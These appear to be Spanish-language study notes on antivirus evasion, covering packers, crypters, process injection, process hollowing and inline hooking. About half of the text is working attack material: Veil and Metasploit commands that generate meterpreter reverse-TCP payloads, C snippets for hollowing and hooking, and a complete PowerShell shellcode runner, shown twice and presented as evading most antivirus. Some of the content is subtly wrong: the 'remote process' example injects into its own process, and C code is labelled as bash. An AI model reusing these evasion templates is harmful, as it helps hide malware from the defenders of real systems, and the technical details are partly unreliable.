# Antivirus Evasion

Propietario: Adrian Gisbert Cabello

### 1. Introducción a la Evasión de Antivirus

La evasión de antivirus se divide en dos categorías principales: en-disco (on-disk) y en-memoria (in-memory). La evasión en-disco se centra en modificar archivos maliciosos almacenados en disco para evitar la detección del antivirus (AV). La evasión en-memoria evita escribir archivos en disco y, en su lugar, manipula la memoria volátil.

### 2. Métodos de Detección de Código Malicioso

1. **Detección Basada en Firmas**: Utiliza secuencias de bytes únicas dentro del malware para identificarlo.
2. **Detección Heurística**: Utiliza reglas y algoritmos para determinar si una acción es maliciosa.
3. **Detección Basada en Comportamiento**: Analiza dinámicamente el comportamiento de un archivo ejecutándolo en un entorno emulado .

### 3. Técnicas de Evasión en-Disk

### 3.1. Packers

Los packers comprimen un ejecutable de manera que cambian la estructura binaria del archivo, generando una nueva firma que puede evitar la detección de AV antiguos y simplistas. Ejemplo: UPX.

```bash
upx -9 malicious.exe
```

Sin embargo, el uso de UPX y otros packers populares por sí solos no es suficiente para evadir los escáneres AV modernos .

### 3.2. Obfuscators

Los ofuscadores reorganizan y mutan el código para hacerlo más difícil de revertir. Incluyen la inserción de instrucciones irrelevantes o "código muerto", y la reordenación de funciones.

```bash
# Usando un ofuscador para Python
pyarmor obfuscate script.py
```

Esta técnica es marginalmente efectiva contra la detección basada en firmas .

### 3.3. Crypters

Los crypters cifran el código ejecutable, añadiendo un stub de descifrado que restaura el código original en tiempo de ejecución. La descodificación ocurre en la memoria, dejando solo el código cifrado en disco.

```bash
# Ejemplo con Veil-Evasion
veil
use 1
set PAYLOAD windows/meterpreter/reverse_tcp
generate
```

### 3.4. Software Protectors

Los protectores de software combinan técnicas de cifrado, ofuscación y anti-depuración, entre otras, para evitar la detección del AV.

```bash
# Ejemplo con Enigma Protector
wine enigma_protector.exe
```

Estos protectores fueron diseñados para propósitos legítimos pero también pueden ser usados para evadir AV .

### 4. Técnicas de Evasión en-Memory

### 4.1. Inyecciones de Memoria de Procesos Remotos

Se intenta inyectar el payload en otro proceso PE válido que no es malicioso utilizando APIs de Windows.

```bash
# Ejemplo con PowerShell
$code = @"
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")] public static extern IntPtr memset(IntPtr dest, uint src, uint count);
"@
$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru
[Byte[]]$sc = <shellcode>
$size = 0x1000
if ($sc.Length -gt 0x1000) {$size = $sc.Length}
$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40)
for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)}
$winFunc::CreateThread(0,0,$x,0,0,0)
for (;;) { Start-Sleep 60 }
```

Esta técnica no escribe ningún archivo en disco, lo que evita la mayoría de los productos AV .

### 4.2. Reflective DLL Injection

Carga una DLL en la memoria del proceso sin escribir en disco.

```bash
# Ejemplo con Metasploit
use exploit/windows/local/reflective_dll_injection
set PAYLOAD windows/meterpreter/reverse_tcp
run
```

Este método requiere escribir una versión personalizada de la API que no dependa de una DLL basada en disco .

### 4.3. Process Hollowing

Lanza un proceso no malicioso en un estado suspendido, reemplaza su imagen en memoria con una imagen ejecutable maliciosa y luego reanuda el proceso.

```bash
# Ejemplo con C/C++
CreateProcess("svchost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
ZwUnmapViewOfSection(pi.hProcess, pImageBase);
NtWriteVirtualMemory(pi.hProcess, pImageBase, pNewImageBase, pImageSize, NULL);
NtResumeThread(pi.hThread, NULL);
```

Esto permite que el código malicioso se ejecute en lugar del proceso legítimo .

### 4.4. Inline Hooking

Modifica la memoria e introduce un hook que redirige la ejecución del código a nuestro código malicioso.

```bash
# Ejemplo con C/C++
DWORD oldProtect;
VirtualProtect((LPVOID)pFunction, length, PAGE_EXECUTE_READWRITE, &oldProtect);
memcpy((LPVOID)pFunction, (LPVOID)pMyFunction, length);
VirtualProtect((LPVOID)pFunction, length, oldProtect, &oldProtect);
```

Este método modifica la ejecución del flujo de código para incluir el código malicioso antes de retornar al flujo original .

### 5. Ejemplo Práctico: Evasión de AV con PowerShell

```powershell
# Ejemplo de inyección en memoria con PowerShell
$code = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);
"@
$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru
[Byte[]]$sc = <shellcode>
$size = 0x1000
if ($sc.Length -gt 0x1000) {$size = $sc.Length}
$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40)
for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)}
$winFunc::CreateThread(0,0,$x,0,0,0)
for (;;) { Start-Sleep 60 }
```

Este script de PowerShell interactúa con la API de Windows para realizar una inyección en memoria, evitando así la detección de AV .